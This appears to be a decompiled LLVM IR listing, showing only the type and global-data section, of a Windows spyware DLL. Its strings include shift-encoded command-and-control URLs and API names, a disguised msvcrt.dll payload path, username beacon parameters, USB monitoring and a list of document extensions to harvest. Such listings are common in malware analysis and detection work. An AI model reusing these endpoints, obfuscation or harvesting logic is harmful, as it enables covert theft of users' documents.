source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%vtable_1002d3b4_type = type { i32 (i8)*, i32 ()* }
%vtable_1002d3cc_type = type { i32 (i8)*, i32 ()* }
%vtable_1002d434_type = type { i32 (i8)*, i32 ()* }
%vtable_1002d44c_type = type { i32 (i8)*, i32 ()*, i32 (i32, i32)*, i32 (i32, i32)*, i32 (i32, i32)*, i32 (i32, i32)* }
%vtable_1002d474_type = type { i32 (i32)* }
%vtable_1002d4bc_type = type { i32 (i32)*, i32 ()*, i32 ()*, i32 (i32)*, i32 (i32)*, i32 ()*, i32 ()*, i32 ()*, i32 (i8*, i64)*, i32 (i8*, i64)*, i32 (i64, i32, i32)*, i32 (i32, i32)*, i32 (i8*, i64)*, i32 ()*, i32 (i32*)* }
%vtable_1002d4fc_type = type { i32 (i32)* }
%vtable_1002d504_type = type { i32 (i32)* }
%vtable_1002d558_type = type { i32 (i32)*, i32 ()* }
%vtable_1002d574_type = type { i32 (i32)*, i32 ()* }
%vtable_1002d58c_type = type { i32 (i32)*, i32 ()* }
%vtable_1002e09c_type = type { i32 (i8)*, i32 ()*, i32 ()*, i32 (i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i64)*, i32 (i32, i32, i32, i32, i32, i64)*, i32 (i32, i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i8, i8)* }
%vtable_1002e0cc_type = type { i32 (i8)*, i32 ()*, i32 ()*, i32 ()*, i32 ()*, i32 (i32)*, i32 (i32)*, i32 (i32)* }
%vtable_10030610_type = type { i32 (i32)* }
%vtable_1003061c_type = type { i32 (i32)*, i32 ()* }
%vtable_10039cac_type = type { i32 (i32)*, i32 ()* }
%__MIDL___MIDL_itf_mfobjects_0000_0008_0002 = type { %__MIDL___MIDL_itf_mfobjects_0000_0008_0001, [1 x i32] }
%__MIDL___MIDL_itf_mfobjects_0000_0008_0001 = type { i32, i32, i32, i16, i16, i32, i32, i32, i32, i32, i32 }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_SYSTEMTIME = type { i16, i16, i16, i16, i16, i16, i16, i16 }
%tagRECT = type { i32, i32, i32, i32 }
%tagSOLE_AUTHENTICATION_SERVICE = type { i32, i32, i16*, i32 }
%tagINPUT = type { i32, i32 }
%lconv = type { i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8 }
%addrinfo = type { i32, i32, i32, i32, i32, i8*, %sockaddr*, %addrinfo* }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%tagWNDCLASSW = type { i32, i32 (i32*, i32, i32, i32)*, i32, i32, i32*, i32*, i32*, i32*, i16*, i16* }
%_OSVERSIONINFOW = type { i32, i32, i32, i32, i32, [128 x i16] }
%_WIN32_FIND_DATAW = type { i32, %_FILETIME, %_FILETIME, %_FILETIME, i32, i32, i32, i32, [1 x i16], [14 x i16], i32, i32, i16 }
%_FILETIME = type { i32, i32 }
%_STARTUPINFOW = type { i32, i16*, i16*, i16*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_PROCESS_INFORMATION = type { i32*, i32*, i32, i32 }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_TOKEN_PRIVILEGES = type { i32, [1 x %_LUID_AND_ATTRIBUTES] }
%_LUID_AND_ATTRIBUTES = type { %_LUID, i32 }
%_LUID = type { i32, i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%_WIN32_FIND_DATAA = type { i32, %_FILETIME, %_FILETIME, %_FILETIME, i32, i32, i32, i32, [1 x i8], [14 x i8], i32, i32, i16 }
%_IO_FILE = type { i32 }
%__locale_struct = type { [13 x %__locale_data*], i16*, i32*, i32*, [13 x i8*] }
%__locale_data = type { i32 }
%_cpinfo = type { i32, [1 x i8], [1 x i8] }
%_TYPEDEF_fenv_t = type { i16, i16, i16, i16, i16, i16, i32, i16, i32, i32, i32, i16, i16, i32 }
%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }

@0 = external local_unnamed_addr global i32
@1 = external local_unnamed_addr global i32
@2 = external local_unnamed_addr global i32
@3 = external local_unnamed_addr global i32
@global_var_10041ac4 = local_unnamed_addr global i32 0
@global_var_10041ad8 = local_unnamed_addr global i32 0
@global_var_10041ad4 = local_unnamed_addr global i32 0
@global_var_1003f011 = local_unnamed_addr global i32 0
@global_var_10041ae0 = global i32 0
@global_var_10039cb8 = constant i32 268439984
@global_var_10039bb4 = constant [18 x i8] c"Unknown exception\00"
@global_var_10039bc8 = constant [9 x i8] c"bad cast\00"
@global_var_1003e084 = local_unnamed_addr global i32 -1153374642
@global_var_10039bd4 = constant [16 x i8] c"bad locale name\00"
@global_var_1002d3c0 = constant i32 268440256
@global_var_1003c264 = local_unnamed_addr constant i32 0
@global_var_1002d3d8 = constant i32 268440864
@global_var_1002d3e8 = constant i32 268441728
@global_var_1002d418 = constant i32 268441824
@global_var_10039bf4 = constant [3 x i8] c": \00"
@global_var_10039bf8 = constant [9 x i8] c"iostream\00"
@global_var_10039c04 = constant [22 x i8] c"iostream stream error\00"
@global_var_1002d468 = constant i32 268442432
@global_var_10039c1c = constant [21 x i8] c"ios_base::badbit set\00"
@global_var_1003c324 = constant i32 0
@global_var_10039c34 = constant [22 x i8] c"ios_base::failbit set\00"
@global_var_10039c4c = constant [21 x i8] c"ios_base::eofbit set\00"
@global_var_1002d440 = constant i32 268442432
@global_var_1003fd9c = local_unnamed_addr global i32 0
@global_var_1003921c = constant [11 x i16] %wide-string
@global_var_10040fc0 = global i32 0
@global_var_10040fc4 = local_unnamed_addr global i32 0
@global_var_10040fc8 = local_unnamed_addr global i32 0
@global_var_10040fcc = local_unnamed_addr global i32 0
@global_var_1003fd98 = local_unnamed_addr global i32 0
@global_var_100391fc = constant [14 x i8] c"GetWindowRect\00"
@global_var_1003920c = local_unnamed_addr constant [16 x i8] c"GdiplusShutdown\00"
@global_var_10040fca = local_unnamed_addr global i32 0
@global_var_10040fd0 = local_unnamed_addr global i32 0
@global_var_10040fd4 = local_unnamed_addr global i32 0
@global_var_10040fd8 = local_unnamed_addr global i32 0
@global_var_100410b4 = local_unnamed_addr global i32 0
@global_var_10039d20 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_1003e9c0 = local_unnamed_addr global i32 -1
@global_var_100410b0 = global i32 0
@global_var_100410bc = local_unnamed_addr global i32 0
@global_var_100405a0 = local_unnamed_addr global i32 0
@global_var_1003e9c4 = global i32 65279
@global_var_10039238 = constant [40 x i16] %wide-string
@global_var_1003fda2 = global i32 0
@global_var_10003558 = local_unnamed_addr constant i32 268447349
@global_var_10039234 = constant i32 32
@global_var_10039d10 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_10039288 = constant i32 43
@global_var_1003928c = constant i32 45
@global_var_10039290 = constant i32 48
@global_var_10039294 = constant i32 49
@global_var_10039298 = constant i32 50
@global_var_1003929c = constant i32 51
@global_var_100392a0 = constant i32 52
@global_var_100392a4 = constant i32 53
@global_var_100392a8 = constant i32 54
@global_var_100392ac = constant i32 55
@global_var_100392b0 = constant i32 56
@global_var_100392b4 = constant i32 57
@global_var_100392b8 = constant i32 42
@global_var_100392bc = constant i32 43
@global_var_100392c0 = constant i32 45
@global_var_100392c4 = constant i32 46
@global_var_100392c8 = constant i32 47
@global_var_100410b8 = global i32 0
@global_var_100392cc = constant [13 x i8] c"kernel32.dll\00"
@global_var_100392dc = local_unnamed_addr constant [7 x i16] %wide-string
@global_var_100392ec = constant i32 0
@global_var_100405a4 = local_unnamed_addr global i32 0
@global_var_10039338 = constant [19 x i8] c"\0A hsguygsgsuysgyug\00"
@global_var_1003934c = constant [15 x i8] c"STARTED!!!!!!\0A\00"
@global_var_1003935c = local_unnamed_addr constant [50 x i8] c"Failed to initialize COM library. Error code = 0x\00"
@global_var_1003f018 = local_unnamed_addr global i32 0
@global_var_10039390 = local_unnamed_addr constant [47 x i8] c"Failed to initialize security. Error code = 0x\00"
@global_var_100305f4 = constant i32 -602757497
@global_var_100305e4 = constant i32 1167128593
@global_var_100393d0 = local_unnamed_addr constant [38 x i8] c"Failed to create IWbemLocator object.\00"
@global_var_100393c0 = local_unnamed_addr constant [15 x i8] c" Err code = 0x\00"
@global_var_100393f8 = constant [11 x i16] %wide-string
@global_var_10039410 = local_unnamed_addr constant [35 x i8] c"Could not connect. Error code = 0x\00"
@global_var_10039434 = local_unnamed_addr constant [45 x i8] c"Could not set proxy blanket. Error code = 0x\00"
@global_var_10039464 = constant [27 x i8] c"SELECT * FROM Win32_USBHub\00"
@global_var_10039480 = constant [4 x i8] c"WQL\00"
@global_var_10039484 = constant [15 x i8] c"Not Connected\0A\00"
@global_var_10039494 = constant [5 x i16] %wide-string
@global_var_100394a0 = constant [27 x i8] c"SELECT * FROM Win32_USBHub\00"
@global_var_100394bc = constant [4 x i8] c"WQL\00"
@global_var_100394c0 = constant [15 x i8] c"Not Connected\0A\00"
@global_var_100394d0 = constant [5 x i16] %wide-string
@global_var_100394dc = constant [16 x i8] c"\0Ausb connected\0A\00"
@global_var_10039c78 = constant [16 x i8] c"string too long\00"
@global_var_10039c64 = constant [3 x i8] c"%p\00"
@global_var_10039c68 = constant [3 x i8] c"Lu\00"
@global_var_10039c6c = constant [3 x i8] c"Ld\00"
@global_var_10039c70 = constant [3 x i8] c"lu\00"
@global_var_10039c74 = constant [3 x i8] c"ld\00"
@global_var_10039c90 = constant [24 x i8] c"invalid string position\00"
@global_var_10039c88 = constant [3 x i8] c"eE\00"
@global_var_10039c8c = constant [3 x i8] c"pP\00"
@global_var_1003f0f0 = local_unnamed_addr global i32 0
@global_var_10041af0 = local_unnamed_addr global i32 0
@global_var_1003f0d0 = local_unnamed_addr global i32 0
@global_var_1003c2d0 = constant i32 0
@global_var_1003f610 = local_unnamed_addr global i32 0
@global_var_10041af8 = global i32 0
@global_var_10041afc = local_unnamed_addr global i32 0
@global_var_10041af4 = local_unnamed_addr global i32 0
@global_var_10041aec = local_unnamed_addr global i32 0
@global_var_10041b04 = local_unnamed_addr global i32 0
@global_var_10041ae8 = local_unnamed_addr global i32 0
@global_var_10039be4 = constant [6 x i8] c"false\00"
@global_var_10039bec = constant [5 x i8] c"true\00"
@global_var_100419d8 = local_unnamed_addr global i32 0
@global_var_100394f0 = local_unnamed_addr constant [21 x i8] c"SetHandleInformation\00"
@global_var_100419e4 = local_unnamed_addr global i32 0
@global_var_100419c4 = local_unnamed_addr global i32 0
@global_var_10041a94 = global i32 0
@global_var_10041a84 = local_unnamed_addr global i32 0
@global_var_10041a7c = local_unnamed_addr global i32 0
@global_var_1003950c = constant [13 x i8] c"GetTempPathA\00"
@global_var_1003951c = constant [4 x i8] c"%d\0A\00"
@global_var_1003e9f4 = global [13 x i8] c"lfsofm43/emm\00"
@global_var_1003e9f8 = local_unnamed_addr global [9 x i8] c"fm43/emm\00"
@global_var_1003e9fc = local_unnamed_addr global [5 x i8] c"/emm\00"
@global_var_1003ea00 = local_unnamed_addr global i32 0
@global_var_100419dc = local_unnamed_addr global i32 0
@global_var_10039520 = constant [5 x i8] c"%02x\00"
@global_var_10039528 = constant [5 x i8] c"%02x\00"
@global_var_10039530 = constant [10 x i8] c"HeapAlloc\00"
@global_var_10041a80 = local_unnamed_addr global i32 0
@global_var_1003954c = constant [8 x i8] c"appdata\00"
@global_var_10039554 = constant [32 x i8] c"\5CMicrosoft\5CTemplates\5Cmsvcrt.dll\00"
@global_var_1003957c = local_unnamed_addr constant [6 x i8] c"dfgfg\00"
@global_var_10039574 = local_unnamed_addr constant [14 x i8] c"asdfg.asdfgfg\00"
@global_var_10039580 = local_unnamed_addr constant i32 103
@global_var_10039584 = local_unnamed_addr constant [13 x i8] c"CreateThread\00"
@global_var_10039594 = constant [13 x i8] c"DMCZ0001.dat\00"
@global_var_1003e9d8 = constant [23 x i8] c"ouemm/emm!!!!!!!!!!!!!\00"
@global_var_1003e9c8 = constant [13 x i8] c"bewbqj43/emm\00"
@global_var_10041a4c = global i32 0
@global_var_10041a50 = local_unnamed_addr global i32 0
@global_var_10041a54 = local_unnamed_addr global i32 0
@global_var_10041a58 = local_unnamed_addr global i32 0
@global_var_100419ec = local_unnamed_addr global i32 0
@global_var_100419f0 = local_unnamed_addr global i32 0
@global_var_100419f4 = local_unnamed_addr global i32 0
@global_var_100419f8 = local_unnamed_addr global i32 0
@global_var_100395a4 = constant [14 x i8] c"SfhPqfoLfzFyX\00"
@global_var_100395b4 = constant [15 x i8] c"SfhTfuWbmvfFyX\00"
@global_var_100395c4 = constant [8 x i8] c"JUSCHED\00"
@global_var_100395cc = constant [8 x i16] %wide-string
@global_var_100419cc = local_unnamed_addr global i32 0
@global_var_10041a74 = local_unnamed_addr global i32 0
@global_var_100395dc = constant [5 x i8] c"uid=\00"
@global_var_100395e4 = local_unnamed_addr constant [4 x i8] c"&u=\00"
@global_var_100395e8 = constant [13 x i8] c"GetUserNameW\00"
@global_var_100395f8 = constant [5 x i8] c"%04x\00"
@global_var_10039600 = constant [5 x i8] c"UNIC\00"
@global_var_10039608 = constant [5 x i8] c"%04x\00"
@global_var_10039610 = local_unnamed_addr constant [5 x i8] c"UNIC\00"
@global_var_10039618 = constant i32 63
@global_var_10039548 = constant [4 x i8] c"%d\0A\00"
@global_var_10039d30 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_10039624 = constant [50 x i8] c"iuuq;00xxx/xfcstt/dpn0dsfbufgffe/qiq@gffeje>5:423\00"
@global_var_10039658 = constant [39 x i8] c"iuuq;00gffe54/dpn04744314394148136/ynm\00"
@global_var_10039680 = constant [54 x i8] c"iuuqt;00bteg589/xpseqsftt/dpn031280130240ij.fwfszpof0\00"
@global_var_100396b8 = constant [70 x i8] c"iuuqt;00sbx/hjuivcvtfsdpoufou/dpn0efwpolfbsot0zushgws0nbtufs0ynm/ynm!\00"
@global_var_10039700 = constant [21 x i8] c"di1jdf/dsbcebodf/dpn\00"
@global_var_10039718 = constant [25 x i8] c"di11tf/dijdlfoljmmfs/dpn\00"
@global_var_10039d40 = local_unnamed_addr constant [16 x i8] c"wininet.dll    \00"
@global_var_10041a90 = local_unnamed_addr global i32 0
@global_var_100419e0 = local_unnamed_addr global i32 0
@global_var_100419c0 = local_unnamed_addr global i32 0
@global_var_10041a78 = local_unnamed_addr global i32 0
@global_var_100419d0 = local_unnamed_addr global i32 0
@global_var_10041a48 = local_unnamed_addr global i32 0
@global_var_10041a10 = local_unnamed_addr global i32 0
@global_var_10041a8c = local_unnamed_addr global i32 0
@global_var_10041a88 = local_unnamed_addr global i32 0
@global_var_10039db0 = local_unnamed_addr constant [16 x i8] c"form-urlencoded\00"
@global_var_10041a18 = local_unnamed_addr global i32 0
@global_var_100419d4 = local_unnamed_addr global i32 0
@global_var_10039734 = constant [3 x i8] c"ok\00"
@global_var_1003974c = local_unnamed_addr constant [5 x i8] c"/emm\00"
@global_var_10039744 = local_unnamed_addr constant [13 x i8] c"lfsofm43/emm\00"
@global_var_10039750 = local_unnamed_addr constant i32 0
@global_var_10039754 = local_unnamed_addr constant [15 x i8] c"CreateProcessA\00"
@global_var_10039764 = local_unnamed_addr constant [24 x i8] c"GetEnvironmentVariableA\00"
@global_var_1003977c = constant [8 x i8] c"appdata\00"
@global_var_10039784 = local_unnamed_addr constant [17 x i8] c"SetThreadContext\00"
@global_var_100397a0 = local_unnamed_addr constant [5 x i8] c"/emm\00"
@global_var_10039798 = local_unnamed_addr constant [13 x i8] c"lfsofm43/emm\00"
@global_var_100397a4 = local_unnamed_addr constant i32 0
@global_var_100397a8 = constant [12 x i8] c"FreeLibrary\00"
@global_var_100397b4 = constant [19 x i16] %wide-string
@global_var_10039738 = constant [5 x i16] %wide-string
@global_var_100397f8 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_10039808 = constant [3 x i8] c"{{\00"
@global_var_1003980c = constant [3 x i8] c"}}\00"
@global_var_10039810 = constant [8 x i8] c"http://\00"
@global_var_10039818 = constant [9 x i8] c"https://\00"
@global_var_10039824 = constant [8 x i8] c"http://\00"
@global_var_1003982c = constant [9 x i8] c"https://\00"
@global_var_10039838 = constant [5 x i8] c"&r=1\00"
@global_var_10039840 = constant [14 x i8] c"404 Not Found\00"
@global_var_10039850 = constant [3 x i8] c"{{\00"
@global_var_10039854 = constant [3 x i8] c"}}\00"
@global_var_10039858 = constant [8 x i8] c"http://\00"
@global_var_10039860 = constant [9 x i8] c"https://\00"
@global_var_1003986c = constant [10 x i8] c"WriteFile\00"
@global_var_10039878 = constant [12 x i8] c"CreateFileW\00"
@global_var_10039884 = constant [3 x i8] c"||\00"
@global_var_10039888 = constant [4 x i8] c"&yy\00"
@global_var_1003988c = constant [3 x i8] c"=1\00"
@global_var_10039890 = constant [4 x i8] c"&tt\00"
@global_var_10039894 = constant [4 x i8] c"&tt\00"
@global_var_10039898 = constant i32 61
@global_var_1003989c = constant [4 x i8] c"&zz\00"
@global_var_100398a0 = constant [3 x i8] c"=1\00"
@global_var_100399dc = constant [9 x i8] c"TY10.dat\00"
@global_var_100399e8 = local_unnamed_addr constant [13 x i8] c"CreateThread\00"
@global_var_100399f8 = constant [3 x i16] %wide-string
@global_var_10041a1c = local_unnamed_addr global i32 0
@global_var_100419c8 = local_unnamed_addr global i32 0
@global_var_10039a08 = local_unnamed_addr constant [13 x i8] c"DMCZ0001.dat\00"
@global_var_10039a0c = local_unnamed_addr constant [9 x i8] c"0001.dat\00"
@global_var_10039a10 = local_unnamed_addr constant [5 x i8] c".dat\00"
@global_var_10039a18 = local_unnamed_addr constant [13 x i8] c"DMCZ0001.dat\00"
@global_var_10039a1c = local_unnamed_addr constant [9 x i8] c"0001.dat\00"
@global_var_10039a20 = local_unnamed_addr constant [5 x i8] c".dat\00"
@global_var_10039a00 = constant [6 x i8] c"POST \00"
@global_var_10039a28 = local_unnamed_addr constant [5 x i8] c"&r=1\00"
@global_var_10039a30 = constant [13 x i8] c"kernel32.dll\00"
@global_var_10039a40 = constant [8 x i8] c"dpoofdu\00"
@global_var_10039a48 = constant [8 x i8] c"connect\00"
@global_var_10039a6c = constant [3 x i8] c"\5C*\00"
@global_var_10039a70 = constant i32 92
@global_var_10039a74 = constant i32 92
@global_var_10039a78 = constant [5 x i8] c".pdf\00"
@global_var_10039a80 = constant [5 x i8] c".doc\00"
@global_var_10039a88 = constant [6 x i8] c".docx\00"
@global_var_10039a90 = constant [5 x i8] c".ppt\00"
@global_var_10039a98 = constant [6 x i8] c".pptx\00"
@global_var_10039aa0 = constant [5 x i8] c".txt\00"
@global_var_10039aa8 = constant i32 92
@global_var_10039aac = constant i32 48
@global_var_10039ab0 = constant [6 x i8] c"HUGE:\00"
@global_var_10039ab8 = constant i32 92
@global_var_10039abc = constant [21 x i8] c"::size crosses 10 MB\00"
@global_var_10039cc0 = constant [63 x i8] c"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\00"
@global_var_10039ad4 = constant [14 x i8] c"TZ0000002.dat\00"
@global_var_10039ae4 = constant [5 x i8] c".pdf\00"
@global_var_10039aec = constant [5 x i8] c".doc\00"
@global_var_10039af4 = constant [6 x i8] c".docx\00"
@global_var_10039afc = constant [5 x i8] c".ppt\00"
@global_var_10039b04 = constant [6 x i8] c".pptx\00"
@global_var_10039b0c = constant [5 x i8] c".txt\00"
@global_var_10039b14 = constant [5 x i8] c"SMB\5C\00"
@global_var_10039b1c = constant [4 x i8] c"C:\5C\00"
@global_var_10039b20 = local_unnamed_addr constant [9 x i8] c"\5CMUT.dat\00"
@global_var_10039b2c = local_unnamed_addr constant [15 x i8] c"\5CTZ0000002.dat\00"
@global_var_10041a98 = local_unnamed_addr global i32 0
@global_var_10039b3c = constant [13 x i8] c"CreateThread\00"
@global_var_10039b4c = constant [34 x i8] c"GetVolumeNameForVolumeMountPointA\00"
@global_var_10039b70 = constant [13 x i8] c"kernel32.dll\00"
@global_var_10039b80 = constant [3 x i8] c"\5C*\00"
@global_var_10039b84 = constant [6 x i8] c"SMB\5C*\00"
@global_var_10039b8c = constant [8 x i8] c"MUT.dat\00"
@global_var_10039b94 = constant [14 x i8] c"TZ0000001.dat\00"
@global_var_10039ba4 = constant [14 x i8] c"TZ0000002.dat\00"
@global_var_1003f0d8 = local_unnamed_addr global i32 0
@global_var_1003e064 = local_unnamed_addr global i32 268506672
@global_var_1003bad8 = local_unnamed_addr constant i32 -28
@global_var_100305e0 = constant i32 268506592
@global_var_1003bb4c = local_unnamed_addr constant i32 0
@global_var_1003f60c = local_unnamed_addr global i32 0
@global_var_10041b0c = local_unnamed_addr global i32 0
@global_var_1003f620 = global i32 0
@global_var_1003f628 = global i32 0
@global_var_10041b08 = global i32 0
@global_var_1003e0b0 = local_unnamed_addr global i32 429065504
@global_var_1003bd78 = constant i32 -28
@global_var_1003f6ec = local_unnamed_addr global i32 0
@global_var_1003f6f0 = local_unnamed_addr global i32 0
@global_var_1003f968 = global i32 0
@global_var_1003f974 = global i32 0
@global_var_1002d39c = constant i32 0
@global_var_1002d38c = constant i32 0
@global_var_1002d3a4 = constant i32 0
@global_var_1002d3a0 = constant i32 0
@global_var_1003bda0 = constant i32 -2
@global_var_1003fc68 = local_unnamed_addr global i32 0
@global_var_1003e2e8 = external global i32
@global_var_10031430 = constant i32 2097184
@global_var_1003e230 = global i32* @global_var_10031430
@global_var_1003e688 = global i32 0
@global_var_1003e2ec = local_unnamed_addr global i32* @global_var_1003e688
@global_var_1003f710 = global i32 0
@global_var_1003f848 = local_unnamed_addr global i32 0
@global_var_10030fc0 = constant i32 1
@global_var_10030fc4 = constant i32 22
@global_var_1003be20 = constant i32 -2
@global_var_1003f6fc = local_unnamed_addr global i32 0
@global_var_1003f6f8 = local_unnamed_addr global i32 0
@global_var_1003be00 = constant i32 -2
@global_var_1003fa58 = global i32 0
@global_var_1003be88 = constant i32 -2
@global_var_1003bea8 = constant i32 -2
@global_var_1003f700 = local_unnamed_addr global i32 0
@global_var_1003e1f8 = global i32 0
@global_var_1003bee8 = constant i32 -2
@global_var_100316b0 = constant i32 50462976
@global_var_10031830 = constant i32 50462976
@global_var_1003fc88 = local_unnamed_addr global i32 0
@global_var_10032300 = local_unnamed_addr constant [4 x i8] c"pow\00"
@global_var_10033320 = local_unnamed_addr constant i32 0
@global_var_1003fd74 = local_unnamed_addr global i32 0
@global_var_1003fd78 = local_unnamed_addr global i32 0
@global_var_1003bf28 = constant i32 -2
@global_var_1003bf48 = constant i32 -2
@global_var_1003e8a8 = local_unnamed_addr global i32* @global_var_1003e688
@global_var_1003fc60 = local_unnamed_addr global i32 0
@global_var_1003fc64 = local_unnamed_addr global i32 0
@global_var_1003fd7c = local_unnamed_addr global i32 0
@global_var_10032428 = external constant i32
@global_var_10032478 = local_unnamed_addr constant [35 x i16] %wide-string
@global_var_100324c0 = local_unnamed_addr constant [32 x i16] %wide-string
@global_var_100306a0 = local_unnamed_addr constant [30 x i16] %wide-string
@global_var_10032500 = local_unnamed_addr constant [28 x i16] %wide-string
@global_var_10032538 = local_unnamed_addr constant [36 x i16] %wide-string
@global_var_10032580 = local_unnamed_addr constant [45 x i16] %wide-string
@global_var_100325e0 = local_unnamed_addr constant [38 x i16] %wide-string
@global_var_1003262c = local_unnamed_addr constant [30 x i16] %wide-string
@global_var_100306dc = local_unnamed_addr constant [29 x i16] %wide-string
@global_var_10032668 = local_unnamed_addr constant [31 x i16] %wide-string
@global_var_100326a8 = local_unnamed_addr constant [29 x i16] %wide-string
@global_var_100326e4 = local_unnamed_addr constant [30 x i16] %wide-string
@global_var_10032720 = local_unnamed_addr constant [39 x i16] %wide-string
@global_var_10032770 = local_unnamed_addr constant [43 x i16] %wide-string
@global_var_100327c8 = local_unnamed_addr constant [43 x i16] %wide-string
@global_var_10032820 = local_unnamed_addr constant [35 x i16] %wide-string
@global_var_10032868 = local_unnamed_addr constant [39 x i16] %wide-string
@global_var_1003068c = local_unnamed_addr constant [9 x i16] %wide-string
@global_var_10030718 = local_unnamed_addr constant [9 x i16] %wide-string
@global_var_100328b8 = local_unnamed_addr constant [7 x i16] %wide-string
@global_var_100323b0 = constant i32 268551770
@global_var_1003fa50 = local_unnamed_addr global i32 0
@global_var_1003bf88 = constant i32 -2
@global_var_1003f980 = global i32 0
@global_var_100328d8 = constant [20 x i8] c"EnumSystemLocalesEx\00"
@global_var_100328d0 = constant i32 4
@global_var_1002e468 = constant [16 x i8] c"GetLocaleInfoEx\00"
@global_var_10032924 = constant [25 x i8] c"GetUserDefaultLocaleName\00"
@global_var_1002e134 = constant [28 x i8] c"InitializeCriticalSectionEx\00"
@global_var_10032950 = constant [18 x i8] c"IsValidLocaleName\00"
@global_var_10032974 = constant [17 x i8] c"LCIDToLocaleName\00"
@global_var_10032964 = constant i32 4
@global_var_1002e478 = constant [14 x i8] c"LCMapStringEx\00"
@global_var_10032990 = constant [17 x i8] c"LocaleNameToLCID\00"
@global_var_10032988 = constant i32 4
@global_var_1003fa54 = local_unnamed_addr global i32 0
@global_var_1003290c = constant i32 0
@global_var_1002e2ac = constant [20 x i8] c"GetCurrentPackageId\00"
@global_var_1003bfc8 = constant i32 -2
@global_var_1003bfe8 = constant i32 -2
@global_var_1003c008 = constant i32 -2
@global_var_1003bfa8 = constant i32 -2
@global_var_1003e1f0 = local_unnamed_addr global i32 -1
@global_var_1003fc6c = global i32 0
@global_var_1003c088 = constant i32 -2
@global_var_1003c0a8 = constant i32 -2
@global_var_1003e170 = local_unnamed_addr global i32 46
@global_var_1003f704 = local_unnamed_addr global i32 0
@global_var_1003112a = local_unnamed_addr constant i32 2097184
@global_var_1003e22c = local_unnamed_addr global i32 1
@global_var_1003c068 = constant i32 -2
@global_var_10032b38 = constant [3 x i16] %wide-string
@global_var_100329fc = external constant i32
@global_var_10032a48 = local_unnamed_addr constant [11 x i16] %wide-string
@global_var_10032aa4 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_10032b40 = constant i32 59
@global_var_10032ab8 = constant i32 67305985
@global_var_1003112c = constant i32 2097184
@global_var_1003e228 = local_unnamed_addr global i32* @global_var_1003112c
@global_var_100329f8 = local_unnamed_addr constant i32 268500016
@global_var_1003c0c8 = constant i32 -2
@global_var_1003c0e8 = constant i32 -2
@global_var_1003fc70 = local_unnamed_addr global i32 0
@global_var_1003fc74 = local_unnamed_addr global i32 0
@global_var_1003c188 = constant i32 -2
@global_var_1003fc80 = local_unnamed_addr global i32 0
@global_var_1003c168 = constant i32 -28
@global_var_10041b14 = local_unnamed_addr global i32 0
@global_var_10033346 = local_unnamed_addr constant i32 0
@global_var_1003c1c8 = constant i32 -2
@global_var_1003fd58 = local_unnamed_addr global i32 0
@global_var_1003fd5c = local_unnamed_addr global i32 0
@global_var_1003fd54 = local_unnamed_addr global i32 0
@global_var_1003fd60 = global i32 0
@global_var_1003e480 = global i32 0
@global_var_1003e588 = global i32 0
@global_var_1003e8a7 = global i32 65439744
@global_var_1003c1a8 = constant i32 -2
@global_var_1003e8a9 = global i32 1049574
@global_var_10031930 = constant i32 1410065408
@global_var_100322cc = constant i32 487260709
@global_var_1003421c = constant [6 x i8] c"1#IND\00"
@global_var_10034214 = constant [7 x i8] c"1#SNAN\00"
@global_var_1003420c = constant [7 x i8] c"1#QNAN\00"
@global_var_10034204 = constant [6 x i8] c"1#INF\00"
@global_var_1003fd94 = local_unnamed_addr global i32 0
@global_var_10038860 = local_unnamed_addr constant [6 x i8] c"log10\00"
@global_var_1003f614 = local_unnamed_addr global i32 0
@global_var_1003b128 = local_unnamed_addr constant i32 429065506
@global_var_1003b154 = local_unnamed_addr constant i32 429065506
@global_var_1003b210 = local_unnamed_addr constant i32 429065506
@global_var_1003ef48 = local_unnamed_addr global i32 0
@global_var_1003f068 = local_unnamed_addr global i32 0
@global_var_1003f010 = local_unnamed_addr global i32 0
@global_var_1003f0fc = local_unnamed_addr global i32 0
@global_var_1003f0f4 = local_unnamed_addr global i32 0
@global_var_1003f181 = local_unnamed_addr global i32 0
@global_var_1003f180 = local_unnamed_addr global i32 0
@global_var_1003e068 = local_unnamed_addr global i32 10
@4 = external global i32
@global_var_10039bf1 = external constant i8*
@global_var_1003a020 = external local_unnamed_addr constant i128
@global_var_10039ee0 = external local_unnamed_addr constant i128
@global_var_10039f80 = external local_unnamed_addr constant i128
@global_var_1003a0a0 = external local_unnamed_addr constant i128
@global_var_10040da8 = global i16* null
@global_var_10039f90 = external local_unnamed_addr constant i128
@global_var_100405a8 = global i16* null
@global_var_100410c0 = global i16* null
@global_var_10040fb0 = global i16 0
